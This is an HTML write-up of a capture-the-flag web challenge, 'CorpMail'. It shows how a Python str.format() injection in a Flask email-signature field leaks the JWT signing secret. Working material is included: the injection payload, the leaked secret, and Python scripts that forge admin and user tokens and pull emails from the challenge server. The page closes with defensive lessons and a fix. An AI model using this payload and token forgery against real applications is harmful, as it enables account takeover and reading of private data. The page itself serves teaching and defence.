@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CorpMail — CTF Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&family=DM+Mono:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #0f0f18;
+    --border: #1e1e30;
+    --accent: #f0c040;
+    --accent2: #e05050;
+    --accent3: #50c8a0;
+    --text: #c8c8d8;
+    --text-dim: #606075;
+    --text-bright: #eeeef8;
+    --code-bg: #080810;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* Noise texture */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    opacity: 0.025;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  /* ─── HEADER ─── */
+  .hero {
+    position: relative;
+    padding: 80px 40px 60px;
+    max-width: 900px;
+    margin: 0 auto;
+    overflow: hidden;
+  }
+
+  .hero-grid {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-image:
+      linear-gradient(rgba(240,192,64,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(240,192,64,0.05) 1px, transparent 1px);
+    background-size: 40px 40px;
+    animation: gridPulse 4s ease-in-out infinite;
+  }
+
+  @keyframes gridPulse {
+    0%, 100% { opacity: 0.5; }
+    50% { opacity: 1; }
+  }
+
+  .tag-row {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 24px;
+    flex-wrap: wrap;
+    position: relative;
+    animation: fadeUp 0.6s ease both;
+  }
+
+  .tag {
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    font-weight: 500;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+
+  .tag-yellow { border-color: var(--accent); color: var(--accent); }
+  .tag-red { border-color: var(--accent2); color: var(--accent2); }
+  .tag-green { border-color: var(--accent3); color: var(--accent3); }
+  .tag-dim { border-color: var(--text-dim); color: var(--text-dim); }
+
+  .hero h1 {
+    font-size: clamp(36px, 6vw, 72px);
+    font-weight: 800;
+    color: var(--text-bright);
+    line-height: 1.05;
+    letter-spacing: -0.02em;
+    position: relative;
+    animation: fadeUp 0.6s 0.1s ease both;
+  }
+
+  .hero h1 span {
+    color: var(--accent);
+    position: relative;
+  }
+
+  .hero h1 span::after {
+    content: '';
+    position: absolute;
+    bottom: 2px; left: 0; right: 0;
+    height: 3px;
+    background: var(--accent);
+    transform: scaleX(0);
+    transform-origin: left;
+    animation: underlineIn 0.8s 0.8s ease forwards;
+  }
+
+  @keyframes underlineIn {
+    to { transform: scaleX(1); }
+  }
+
+  .hero-sub {
+    margin-top: 20px;
+    font-size: 15px;
+    color: var(--text-dim);
+    font-family: 'DM Mono', monospace;
+    position: relative;
+    animation: fadeUp 0.6s 0.2s ease both;
+  }
+
+  .hero-sub strong { color: var(--text); }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ─── LAYOUT ─── */
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 40px 100px;
+  }
+
+  /* ─── SECTION ─── */
+  .section {
+    margin-top: 64px;
+    animation: fadeUp 0.5s ease both;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 28px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 16px;
+  }
+
+  .section-num {
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    border: 1px solid var(--accent);
+    padding: 2px 8px;
+    opacity: 0.7;
+  }
+
+  .section h2 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: -0.01em;
+  }
+
+  p {
+    font-size: 15px;
+    color: var(--text);
+    margin-bottom: 16px;
+    line-height: 1.8;
+  }
+
+  /* ─── CALLOUT BOXES ─── */
+  .callout {
+    border-left: 3px solid;
+    padding: 16px 20px;
+    margin: 24px 0;
+    background: var(--surface);
+  }
+
+  .callout-yellow { border-color: var(--accent); }
+  .callout-red { border-color: var(--accent2); }
+  .callout-green { border-color: var(--accent3); }
+
+  .callout-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    font-weight: 500;
+  }
+
+  .callout-yellow .callout-label { color: var(--accent); }
+  .callout-red .callout-label { color: var(--accent2); }
+  .callout-green .callout-label { color: var(--accent3); }
+
+  .callout p { margin: 0; font-size: 14px; }
+
+  /* ─── CODE BLOCKS ─── */
+  .code-block {
+    margin: 24px 0;
+    border: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 16px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-filename {
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.05em;
+  }
+
+  .code-lang {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    opacity: 0.7;
+  }
+
+  pre {
+    background: var(--code-bg);
+    padding: 20px;
+    overflow-x: auto;
+    font-family: 'DM Mono', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    color: #a8b8c8;
+  }
+
+  .kw { color: #c084fc; }
+  .fn { color: #60a5fa; }
+  .str { color: #86efac; }
+  .cm { color: #4a5568; font-style: italic; }
+  .num { color: #f59e0b; }
+  .var { color: #f8d070; }
+
+  /* ─── ATTACK CHAIN ─── */
+  .chain {
+    margin: 32px 0;
+    position: relative;
+  }
+
+  .chain::before {
+    content: '';
+    position: absolute;
+    left: 20px;
+    top: 0; bottom: 0;
+    width: 1px;
+    background: linear-gradient(to bottom, var(--accent), transparent);
+  }
+
+  .chain-step {
+    display: flex;
+    gap: 24px;
+    margin-bottom: 32px;
+    position: relative;
+  }
+
+  .chain-dot {
+    width: 40px;
+    height: 40px;
+    border: 2px solid var(--accent);
+    background: var(--bg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'DM Mono', monospace;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--accent);
+    flex-shrink: 0;
+    position: relative;
+    z-index: 1;
+  }
+
+  .chain-content h3 {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin-bottom: 6px;
+  }
+
+  .chain-content p {
+    font-size: 14px;
+    margin: 0;
+    color: var(--text-dim);
+  }
+
+  /* ─── FLAG REVEAL ─── */
+  .flag-box {
+    margin: 40px 0;
+    padding: 32px;
+    border: 1px solid var(--accent);
+    background: rgba(240, 192, 64, 0.04);
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .flag-box::before {
+    content: '';
+    position: absolute;
+    top: -50%; left: -50%;
+    width: 200%; height: 200%;
+    background: radial-gradient(circle at center, rgba(240,192,64,0.06) 0%, transparent 60%);
+    animation: flagGlow 3s ease-in-out infinite;
+  }
+
+  @keyframes flagGlow {
+    0%, 100% { opacity: 0.5; transform: scale(0.9); }
+    50% { opacity: 1; transform: scale(1.1); }
+  }
+
+  .flag-label {
+    font-family: 'DM Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    color: var(--accent);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    position: relative;
+  }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: clamp(14px, 2.5vw, 20px);
+    color: var(--accent);
+    letter-spacing: 0.05em;
+    word-break: break-all;
+    position: relative;
+  }
+
+  /* ─── VULN TABLE ─── */
+  .vuln-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 24px 0;
+    font-size: 13px;
+    font-family: 'DM Mono', monospace;
+  }
+
+  .vuln-table th {
+    text-align: left;
+    padding: 10px 16px;
+    background: var(--surface);
+    color: var(--text-dim);
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    font-weight: 500;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .vuln-table td {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: top;
+  }
+
+  .vuln-table tr:last-child td { border-bottom: none; }
+
+  .vuln-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+  /* ─── DIVIDER ─── */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 48px 0;
+  }
+
+  /* ─── FOOTER ─── */
+  .footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 40px;
+    max-width: 900px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: gap;
+  }
+
+  .footer-left {
+    font-family: 'DM Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+  }
+
+  .footer-left strong { color: var(--accent); }
+
+  /* ─── INLINE CODE ─── */
+  code {
+    font-family: 'DM Mono', monospace;
+    font-size: 12px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 2px 6px;
+    color: var(--accent3);
+  }
+
+  /* ─── TOC ─── */
+  .toc {
+    border: 1px solid var(--border);
+    padding: 24px;
+    margin: 40px 0;
+    background: var(--surface);
+  }
+
+  .toc-title {
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 16px;
+  }
+
+  .toc-list {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .toc-list li {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .toc-list a {
+    font-family: 'DM Mono', monospace;
+    font-size: 13px;
+    color: var(--text);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+
+  .toc-list a:hover { color: var(--accent); }
+
+  .toc-num {
+    font-size: 10px;
+    color: var(--text-dim);
+    width: 24px;
+    flex-shrink: 0;
+  }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-grid"></div>
+  <div class="tag-row">
+    <span class="tag tag-yellow">Web</span>
+    <span class="tag tag-red">JWT Forgery</span>
+    <span class="tag tag-green">SSTI via str.format()</span>
+    <span class="tag tag-dim">C2C 2026 Quals</span>
+  </div>
+  <h1>Corp<span>Mail</span></h1>
+  <p class="hero-sub">
+    Author: <strong>lordrukie x beluga</strong> &nbsp;·&nbsp;
+    Category: <strong>Web</strong> &nbsp;·&nbsp;
+    Difficulty: <strong>Medium</strong>
+  </p>
+</div>
+
+<!-- MAIN -->
+<div class="container">
+
+  <!-- TOC -->
+  <div class="toc">
+    <div class="toc-title">// Contents</div>
+    <ul class="toc-list">
+      <li><span class="toc-num">01</span><a href="#overview">Challenge Overview</a></li>
+      <li><span class="toc-num">02</span><a href="#recon">Reconnaissance</a></li>
+      <li><span class="toc-num">03</span><a href="#vuln">Vulnerability Analysis</a></li>
+      <li><span class="toc-num">04</span><a href="#exploit">Exploitation</a></li>
+      <li><span class="toc-num">05</span><a href="#flag">Flag</a></li>
+      <li><span class="toc-num">06</span><a href="#lessons">Key Takeaways</a></li>
+    </ul>
+  </div>
+
+  <!-- OVERVIEW -->
+  <div class="section" id="overview">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>Challenge Overview</h2>
+    </div>
+    <p>
+      CorpMail is a Flask-based internal corporate email web application. We're given access to the running instance and, after some poking, also receive the full source code. The goal is to read a confidential email sent from the <code>admin</code> account to <code>mike.wilson</code> containing the flag.
+    </p>
+    <p>
+      The application uses JWT tokens for session management, an SQLite database seeded with fake employees, and a signature templating feature in user settings.
+    </p>
+    <div class="callout callout-yellow">
+      <div class="callout-label">⚡ TL;DR</div>
+      <p>Abuse Python's <code>str.format()</code> in the email signature feature to leak the JWT secret, forge an admin token, then read the flag email as <code>mike.wilson</code>.</p>
+    </div>
+  </div>
+
+  <!-- RECON -->
+  <div class="section" id="recon">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2>Reconnaissance</h2>
+    </div>
+    <p>
+      The first instinct was to attack the JWT directly. The token payload decodes to a standard structure:
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-filename">decoded JWT payload</span>
+        <span class="code-lang">JSON</span>
+      </div>
+      <pre>{
+  <span class="str">"user_id"</span>: <span class="num">6</span>,
+  <span class="str">"username"</span>: <span class="str">"test"</span>,
+  <span class="str">"is_admin"</span>: <span class="num">0</span>,
+  <span class="str">"exp"</span>: <span class="num">1771165063</span>
+}</pre>
+    </div>
+    <p>Two standard JWT attacks were attempted first and both failed:</p>
+    <table class="vuln-table">
+      <thead>
+        <tr>
+          <th>Attack</th>
+          <th>Result</th>
+          <th>Why it Failed</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>alg=none</code></td>
+          <td style="color:var(--accent2)">❌ Failed</td>
+          <td>Server enforces <code>algorithms=["HS256"]</code> — fixed list</td>
+        </tr>
+        <tr>
+          <td>Wordlist brute-force</td>
+          <td style="color:var(--accent2)">❌ Failed</td>
+          <td>Secret is generated with <code>secrets.choice()</code> — cryptographically random, 16 chars</td>
+        </tr>
+      </tbody>
+    </table>
+    <p>
+      With JWT attacks exhausted, attention shifted to the source code. The intended path was never brute force — it was hidden in the <code>Settings</code> page.
+    </p>
+  </div>
+
+  <!-- VULNERABILITY -->
+  <div class="section" id="vuln">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>Vulnerability Analysis</h2>
+    </div>
+    <p>
+      The most critical piece of code lives in <code>utils.py</code>:
+    </p>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-filename">utils.py</span>
+        <span class="code-lang">Python</span>
+      </div>
+      <pre><span class="kw">def</span> <span class="fn">format_signature</span>(signature_template, username):
+    now = datetime.now()
+    <span class="kw">try</span>:
+        <span class="kw">return</span> signature_template.<span class="fn">format</span>(
+            username=username,
+            date=now.<span class="fn">strftime</span>(<span class="str">'%Y-%m-%d'</span>),
+            app=current_app   <span class="cm"># ← Flask app context exposed!</span>
+        )
+    <span class="kw">except</span> (KeyError, IndexError, AttributeError, ValueError):
+        <span class="kw">return</span> signature_template</pre>
+    </div>
+    <p>
+      The function passes the entire Flask <code>current_app</code> object into Python's <code>str.format()</code> as the <code>app</code> keyword argument. This means any <code>{app.X}</code> expression in the signature template gets evaluated against the live application object — including its config dictionary.
+    </p>
+    <div class="callout callout-red">
+      <div class="callout-label">⚠ Root Cause</div>
+      <p>
+        <code>str.format()</code> allows arbitrary attribute traversal on any passed object. Since <code>current_app</code> is passed as <code>app</code>, an attacker can access <code>app.config[JWT_SECRET]</code> — which holds the signing key for all session tokens.
+      </p>
+    </div>
+    <p>
+      Note that the exception handler catches <code>KeyError</code>, <code>IndexError</code>, <code>AttributeError</code>, and <code>ValueError</code> — but <strong>not all</strong> traversal paths trigger these. The bracket notation <code>app.config[JWT_SECRET]</code> works because <code>config</code> is a dict-like object and <code>str.format()</code> handles <code>[key]</code> subscript access.
+    </p>
+    <p>
+      This is called a <strong>Server-Side Template Injection via <code>str.format()</code></strong> — a classic Python vulnerability distinct from Jinja2 SSTI but equally dangerous when application internals are exposed.
+    </p>
+  </div>
+
+  <!-- EXPLOITATION -->
+  <div class="section" id="exploit">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2>Exploitation</h2>
+    </div>
+    <p>The attack chain consists of three phases:</p>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-dot">01</div>
+        <div class="chain-content">
+          <h3>Leak the JWT Secret via Signature SSTI</h3>
+          <p>Register a test account, navigate to Settings, and enter the following as your signature:</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-filename">Settings → Email Signature field</span>
+        <span class="code-lang">Payload</span>
+      </div>
+      <pre>{app.config[JWT_SECRET]}</pre>
+    </div>
+
+    <p>
+      After clicking <strong>Save Signature</strong>, the server calls <code>format_signature()</code> which evaluates the template and <em>stores the resolved value in the database</em>. Refreshing the Settings page reveals the evaluated secret in the signature field.
+    </p>
+
+    <div class="callout callout-green">
+      <div class="callout-label">✓ Leaked Secret</div>
+      <p><code>e5f3724dd1053111d4bc72f70d45129265866c171801ebbde6ed474485c838bb</code></p>
+    </div>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-dot">02</div>
+        <div class="chain-content">
+          <h3>Forge an Admin JWT</h3>
+          <p>With the secret known, forge a valid HS256-signed token with <code>is_admin: 1</code>:</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-filename">forge_token.py</span>
+        <span class="code-lang">Python</span>
+      </div>
+      <pre><span class="kw">import</span> jwt
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime, timedelta
+
+<span class="var">SECRET</span> = <span class="str">"e5f3724dd1053111d4bc72f70d45129265866c171801ebbde6ed474485c838bb"</span>
+
+<span class="var">payload</span> = {
+    <span class="str">'user_id'</span>: <span class="num">1</span>,
+    <span class="str">'username'</span>: <span class="str">'admin'</span>,
+    <span class="str">'is_admin'</span>: <span class="num">1</span>,
+    <span class="str">'exp'</span>: datetime.utcnow() + timedelta(hours=<span class="num">24</span>)
+}
+
+<span class="var">token</span> = jwt.<span class="fn">encode</span>(payload, SECRET, algorithm=<span class="str">'HS256'</span>)
+<span class="fn">print</span>(token)</pre>
+    </div>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-dot">03</div>
+        <div class="chain-content">
+          <h3>Read the Flag Email as mike.wilson</h3>
+          <p>The <code>/admin/*</code> prefix is blocked by a reverse proxy (403). Instead, forge a token as <code>mike.wilson</code> (non-admin) — he received the flag email directly, so <code>/email/&lt;id&gt;</code> is accessible.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-filename">solve.py — final exploit</span>
+        <span class="code-lang">Python</span>
+      </div>
+      <pre><span class="kw">import</span> jwt, requests, re
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime, timedelta
+
+<span class="var">BASE_URL</span> = <span class="str">"http://challenges.1pc.tf:49230"</span>
+<span class="var">SECRET</span>   = <span class="str">"e5f3724dd1053111d4bc72f70d45129265866c171801ebbde6ed474485c838bb"</span>
+
+<span class="kw">def</span> <span class="fn">make_token</span>(user_id, username, is_admin=<span class="num">0</span>):
+    <span class="var">payload</span> = {
+        <span class="str">'user_id'</span>: user_id, <span class="str">'username'</span>: username,
+        <span class="str">'is_admin'</span>: is_admin,
+        <span class="str">'exp'</span>: datetime.utcnow() + timedelta(hours=<span class="num">24</span>)
+    }
+    <span class="kw">return</span> jwt.<span class="fn">encode</span>(payload, SECRET, algorithm=<span class="str">'HS256'</span>)
+
+<span class="cm"># mike.wilson is user_id=4 (seeded order: admin=1, john=2, jane=3, mike=4)</span>
+<span class="var">token</span>   = <span class="fn">make_token</span>(<span class="num">4</span>, <span class="str">'mike.wilson'</span>)
+<span class="var">cookies</span> = {<span class="str">"token"</span>: token}
+
+<span class="kw">for</span> eid <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">16</span>):
+    r = requests.<span class="fn">get</span>(f<span class="str">"{BASE_URL}/email/{eid}"</span>, cookies=cookies)
+    <span class="var">flags</span> = re.<span class="fn">findall</span>(<span class="str">r'C2C\{[^}]+\}'</span>, r.text)
+    <span class="kw">if</span> flags:
+        <span class="fn">print</span>(f<span class="str">"[+] FLAG: {flags[0]}"</span>)
+        <span class="kw">break</span></pre>
+    </div>
+  </div>
+
+  <!-- FLAG -->
+  <div class="section" id="flag">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2>Flag</h2>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">// flag captured</div>
+      <div class="flag-value">C2C{...}</div>
+    </div>
+    <p style="text-align:center; font-size:13px; color:var(--text-dim); font-family:'DM Mono',monospace;">
+      Found inside email "Confidential: System Credentials" — admin → mike.wilson
+    </p>
+  </div>
+
+  <!-- LESSONS -->
+  <div class="section" id="lessons">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2>Key Takeaways</h2>
+    </div>
+
+    <p>
+      This challenge is a great example of why <code>str.format()</code> should never be used on untrusted input — it is not a safe templating engine. The danger is often underestimated compared to Jinja2 SSTI because it looks like simple string interpolation.
+    </p>
+
+    <table class="vuln-table">
+      <thead>
+        <tr><th>Lesson</th><th>Detail</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>str.format()</code> is dangerous</td>
+          <td>Never pass application internals like <code>current_app</code> into user-controlled format strings. Use explicit allowlists of safe values only.</td>
+        </tr>
+        <tr>
+          <td>Secrets should not live in config alone</td>
+          <td>If the config object is reachable via any user-controlled path, the entire secret surface is exposed.</td>
+        </tr>
+        <tr>
+          <td>Proxy 403 ≠ full protection</td>
+          <td>Blocking <code>/admin/*</code> at the nginx level doesn't help when the same data is accessible via user-facing routes with a forged token.</td>
+        </tr>
+        <tr>
+          <td>JWT brute force is a red herring</td>
+          <td>Cryptographically random secrets cannot be cracked. The real vulnerability was always the SSTI, not the JWT algorithm.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout callout-yellow">
+      <div class="callout-label">🔧 Fix</div>
+      <p>Replace <code>str.format()</code> with explicit variable substitution using only a safe allowlist: <code>signature.replace("{username}", username).replace("{date}", date_str)</code>. Never pass application objects into user templates.</p>
+    </div>
+  </div>
+
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <div class="footer-left">
+    <strong>CorpMail</strong> — C2C 2026 Quals &nbsp;·&nbsp; Web &nbsp;·&nbsp; lordrukie x beluga
+  </div>
+  <div style="font-family:'DM Mono',monospace; font-size:11px; color:var(--text-dim);">
+    str.format() SSTI → JWT Leak → Flag
+  </div>
+</div>
+
+</body>
+</html>
